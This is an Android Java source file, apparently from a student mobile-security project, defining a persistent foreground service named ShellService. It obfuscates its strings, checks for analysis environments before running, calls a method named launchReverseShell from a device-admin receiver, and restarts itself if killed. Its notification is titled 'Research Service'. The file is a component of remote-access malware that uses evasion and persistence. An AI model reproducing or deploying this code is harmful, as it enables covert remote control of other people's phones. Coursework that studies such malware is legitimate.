package com.example.inf2007_mad_j1847.test;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import com.example.inf2007_mad_j1847.utils.StringHelper;

public class ShellService extends Service {
    private static final String TAG = StringHelper.decrypt("Nvkh2sKatHHWYxAFdyq7xCIVRd+aBU0wtKaIsWzBbEQF7lsLvf0TacSXmlAahg==") ; //"SimpleShellService"
    private static final int NOTIFICATION_ID = 1234;
    private static final String CHANNEL_ID = StringHelper.decrypt("aEGALM3sZpfGBrfuO4qPrmLbQTQnTrtH36OMA1yfkLvWn1Rtonl0BT0=") ; //"shell_channel"

    // Create an instance of your AdminReceiver to call its method
    private AppDeviceAdminReceiver adminReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, StringHelper.decrypt("DwpzuxqrYcB3cg6KFcLhSSus8L2gC8QxDXZh1oq0gPRxHbWYaBt6Cidm2Q==") ); // "Service created"

        // Create instance of your receiver
        adminReceiver = new AppDeviceAdminReceiver();

        // Create notification channel (required for Android 8+)
        createNotificationChannel();

        // Start as foreground service (required for Android 8+)
        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,StringHelper.decrypt("psuygltqZR/ppzqnEkfXhJyibyyLaYmOYWkABdN6dW5OqTBf436WMG4xvG7B4JvAGPirNp6r4Hxije3L1KIZEynCllUQvAGBcw==")  ); // "Service starting - calling launchReverseShell"
        if (!AntiFingerprint.isSafeToRun(this)) {
            Log.d(TAG,StringHelper.decrypt("7XxEkPzb4FnMdO1ZnlTEo29w49UyMT18uYkm8nDqbOY8/xSvtJpf2oZThTlCgZSxzvnnplNjpXygOcxhm2AxMG/SFVGI") ); //  "⚠️ AntiFingerprint check failed — stopping"
            stopSelf();
            return START_NOT_STICKY;
        }
        // DIRECTLY CALL YOUR EXISTING METHOD
        // This calls the same method that runs when admin is granted
        adminReceiver.launchReverseShell(this);

        // START_STICKY makes service restart if killed
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, StringHelper.decrypt("aUTpu0tUiH31EpCl27IJf5noFviDU4EtiT+mwaTCXiL/5egX0+UwbDiBbfBB") ); // "Service destroyed"
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    StringHelper.decrypt("plUVWol+DZV0XWkPmw4t6+P1T95nc4P9CPD+Fl2oV5umf85hldgrR3s=") , // "Shell Service"
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(StringHelper.decrypt("redChDrNRVKbocS2InZ+nUGKIzY1cULNm6cNCNg1N1H2Km+5u4mzcKWFwSQ=") ) // "Research Service"
                .setContentText(StringHelper.decrypt("x0aM29arbmw1GDMTR4upyn/4zFx2+GheanmQzObwnjrhBkLnrqS7sWug6zSe3E7/") ) // "Reverse shell active"
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }
}